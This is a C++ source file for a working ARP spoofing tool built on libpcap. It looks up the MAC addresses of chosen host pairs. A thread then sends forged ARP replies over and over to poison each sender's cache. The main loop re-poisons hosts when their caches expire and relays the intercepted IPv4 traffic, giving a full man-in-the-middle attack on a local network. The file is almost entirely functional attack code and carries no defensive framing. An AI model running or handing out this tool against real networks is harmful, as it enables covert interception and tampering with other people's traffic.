#include <cstdio>
#include <cstring>
#include <pcap.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include "ethhdr.h"
#include "arphdr.h"

#define IP_BUF_SIZE 20

#pragma pack(push, 1)
struct EthArpPacket {
        EthHdr eth_;
        ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
        printf("syntax: send-arp <interface> <sender ip> <receiver ip>\n");
        printf("sample: send-arp wlan0 192.168.0.152 192.168.0.1\n");
}

void getMyInfo(Mac* myMac, Ip* myIP, const char* dev) {
        int fd = socket(AF_INET, SOCK_DGRAM, 0);
        if (fd < 0) {
                fprintf(stderr, "getMyMac() socket open error.");
                exit(1);
        }
        struct ifreq ifr;

        ifr.ifr_addr.sa_family = AF_INET;
        strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

        if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
                fprintf(stderr, "getMyMac() error1.");
                exit(1);
        }
        uint8_t mac[Mac::SIZE];
        memcpy(mac, ifr.ifr_hwaddr.sa_data, Mac::SIZE);

        if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
                fprintf(stderr, "getMyMac() error2.");
                exit(1);
        }
        struct sockaddr_in* sin;
        sin = (sockaddr_in*)(&ifr.ifr_addr);

        *(myMac) = Mac(mac);
        *(myIP) = Ip(inet_ntoa(sin->sin_addr));
        close(fd);
}

void getMac(Mac* MAC, Ip IP, Mac myMac, Ip myIP, const char* dev) {
        char errbuf[PCAP_ERRBUF_SIZE];
        pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
        if (handle == nullptr) {
                fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
                exit(1);
        }
        EthArpPacket packet;

        packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
        packet.eth_.smac_ = myMac;
        packet.eth_.type_ = htons(EthHdr::Arp);

        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
        packet.arp_.op_ = htons(ArpHdr::Request);
        packet.arp_.smac_ = myMac;
        packet.arp_.sip_ = htonl(myIP);
        packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
        packet.arp_.tip_ = htonl(IP);

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                exit(1);
        }
        while (true) {
                struct pcap_pkthdr* header;
                const u_char* pkt;
                int res = pcap_next_ex(handle,&header, &pkt);

                if (!(res > 0)) continue;

                EthArpPacket* p = (EthArpPacket*) pkt;
                if ((p->eth_.type_ != htons(EthHdr::Arp)) || (p->arp_.op_ != htons(ArpHdr::Reply))) continue;

                if (memcmp(&(p->arp_.sip_), &(packet.arp_.tip_), sizeof(Ip)) == 0) {
                        memcpy(MAC, &(p->arp_.smac_), sizeof(Mac));
                        break;
                }
        }
        pcap_close(handle);
}


void sendAttackPacket(Mac senderMac, Mac myMac, Ip senderIP, Ip receiverIP, const char* dev) {
        char errbuf[PCAP_ERRBUF_SIZE];
        pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
        if (handle == nullptr) {
                fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
                exit(1);
        }
        EthArpPacket packet;

        packet.eth_.dmac_ = senderMac;
        packet.eth_.smac_ = myMac;
        packet.eth_.type_ = htons(EthHdr::Arp);

        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
        packet.arp_.op_ = htons(ArpHdr::Reply);
        packet.arp_.smac_ = myMac;
        packet.arp_.sip_ = htonl(receiverIP);
        packet.arp_.tmac_ = senderMac;
        packet.arp_.tip_ = htonl(senderIP);

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                exit(1);
        }

        pcap_close(handle);
}


Mac myMac;
Ip myIP;
Mac senderMac[4];
Ip senderIP[4];
Mac receiverMac[4];
Ip receiverIP[4];
const char* dev;

void* freqAttack (void* arg) {
	int cycle = 0;
	while (true) {
		for (int i = 0; i < *((int*)arg); i++)
			sendAttackPacket(senderMac[i], myMac, senderIP[i], receiverIP[i], dev);
		cycle++;
		if (cycle > 3)
			sleep(5);
	}
	return nullptr;
}

int main (int argc, char* argv[]) {
	if ((argc < 4) || (argc % 2 != 0 ) || (argc > 10)) {
		usage();
		exit(1);
	}

	dev = argv[1];
	int s = argc / 2 - 1;
	
	getMyInfo(&myMac, &myIP, dev);
	for (int i = 0; i < s; i++) {
		senderMac[i] = Mac();
		senderIP[i] = Ip(argv[2 * i + 2]);
		receiverIP[i] = Ip(argv[2 *i + 3]);

		getMac(&senderMac[i], senderIP[i], myMac, myIP, dev);
		getMac(&receiverMac[i], receiverIP[i], myMac, myIP, dev);
	}

	pthread_t p;
	pthread_create(&p, nullptr, freqAttack, (void*)&s);

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		exit(1);
	}
	printf("Arp Spoofing starts\n");
	
	struct pcap_pkthdr* header;
	const u_char* pkt;

	while (true) {
		int res = pcap_next_ex(handle, &header, &pkt);
		if (res < 0) continue;
		
		EthArpPacket* ptr = (EthArpPacket*) pkt;
		if ((ptr->eth_.type_ == htons(EthHdr::Arp)) && (ptr->arp_.op_ == htons(ArpHdr::Request))) {
			for (int i = 0; i < s; i++) {
				bool case1 = (memcmp( &(ptr->arp_.smac_), &(senderMac[i]), sizeof(Mac) ) == 0) && (memcmp( &(ptr->arp_.tip_), &(receiverIP[i]), sizeof(Ip) ) == 0); // sender arp table cache expired
				bool case2 = (memcmp( &(ptr->arp_.smac_), &(receiverMac[i]), sizeof(Mac) ) == 0) && (memcmp( &(ptr->arp_.tip_), &(senderIP[i]), sizeof(Ip) ) == 0); // receiver scan request
				if ( case1 || case2 )
					sendAttackPacket(senderMac[i], myMac, senderIP[i], receiverIP[i], dev);
			}
		} else if (ptr->eth_.type_ == htons(EthHdr::Ip4)) {
			for (int i = 0; i < s; i++) {
				if ( (memcmp( &(ptr->eth_.smac_), &(senderMac[i]), sizeof(Mac) ) == 0)) {
					memcpy(&(ptr->eth_.smac_), &myMac, sizeof(Mac));
					memcpy(&(ptr->eth_.dmac_), &(receiverMac[i]), sizeof(Mac));
				  	
					if ( pcap_sendpacket(handle, reinterpret_cast<const u_char*>(pkt), ((header->caplen) < 1500 ? header->caplen : 1500) ) < 0 ) {
						fprintf(stderr, "pcap_sendpacket error (%s)\n", pcap_geterr(handle));
						exit(1);
					}
				}
			}
		}
	}	
	pthread_join(p, nullptr);
	return 0;
}



